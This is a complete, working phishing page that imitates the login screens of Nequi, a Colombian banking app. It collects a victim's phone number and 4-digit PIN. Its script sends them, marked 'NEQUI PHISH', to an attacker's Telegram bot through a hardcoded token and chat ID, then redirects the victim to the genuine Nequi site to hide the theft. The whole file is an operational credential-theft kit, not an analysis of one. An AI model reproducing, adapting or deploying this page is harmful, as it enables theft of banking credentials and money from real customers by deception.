<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #120B24;
            height: 100vh; 
            color: white;
            overflow: hidden;
        }
        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 16px;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
        }
        .help {
            width: 28px; height: 28px;
            border: 2px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }
        .logo {
            font-size: 52px;
            font-weight: 700;
            color: #DA0081;
            text-align: center;
            margin-top: 80px;
            margin-bottom: 60px;
        }
        .input-wrapper {
            background: rgba(255,255,255,0.08);
            border-radius: 6px;
            padding: 4px;
            margin-bottom: 16px;
        }
        .input-group {
            display: flex;
            align-items: center;
            background: rgba(255,255,255,0.1);
            border-radius: 6px;
        }
        .country-code {
            padding: 0 16px;
            color: #FF69B4;
            font-weight: 500;
            border-right: 2px solid #6B2B7A;
        }
        input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 16px;
            font-size: 17px;
            color: white;
            outline: none;
        }
        input::placeholder { color: rgba(255,255,255,0.65); }
        button {
            width: 100%;
            height: 52px;
            background: #FF2D95;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 500;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container" id="screen1">
        <header>
            <div class="help">?</div>
        </header>
        <div class="logo">Nequi</div>
        
        <div style="margin-top:auto; margin-bottom:30px;">
            <form id="phoneForm">
                <div class="input-wrapper">
                    <div class="input-group">
                        <div class="country-code">+57</div>
                        <input type="tel" id="phone" placeholder="Ingresa tu cel" maxlength="10" inputmode="numeric" required>
                    </div>
                </div>
                <button type="submit">Entra</button>
            </form>
        </div>
    </div>

    <!-- Segunda pantalla: Clave de 4 dígitos -->
    <div class="container" id="screen2" style="display:none;">
        <header>
            <div class="help">?</div>
        </header>
        <div class="logo">Nequi</div>
        
        <div style="margin-top:auto; margin-bottom:30px;">
            <form id="passForm">
                <p style="text-align:center; margin-bottom:20px; color:#ccc;">Ingresa tu clave de 4 dígitos</p>
                <div class="input-wrapper">
                    <input type="password" id="password" placeholder="Clave de 4 dígitos" maxlength="4" inputmode="numeric" required>
                </div>
                <button type="submit">Ingresar</button>
            </form>
        </div>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";
        let phoneNumber = "";

        // Primera pantalla
        document.getElementById("phoneForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const phone = document.getElementById("phone").value.trim().replace(/\D/g, '');
            
            if (phone.length !== 10 || !phone.startsWith("3")) {
                alert("Ingresa un número válido");
                return;
            }

            phoneNumber = phone;
            document.getElementById("screen1").style.display = "none";
            document.getElementById("screen2").style.display = "flex";
        });

        // Segunda pantalla (Clave)
        document.getElementById("passForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const pass = document.getElementById("password").value.trim();

            if (pass.length !== 4 || !/^\d{4}$/.test(pass)) {
                alert("La clave debe ser de 4 dígitos");
                return;
            }

            const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 Clave: ${pass}\n⏰ Hora: ${new Date().toLocaleString('es-CO')}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            setTimeout(() => {
                window.location.href = "https://www.nequi.com.co";
            }, 800);
        });
    </script>
</body>
</html>
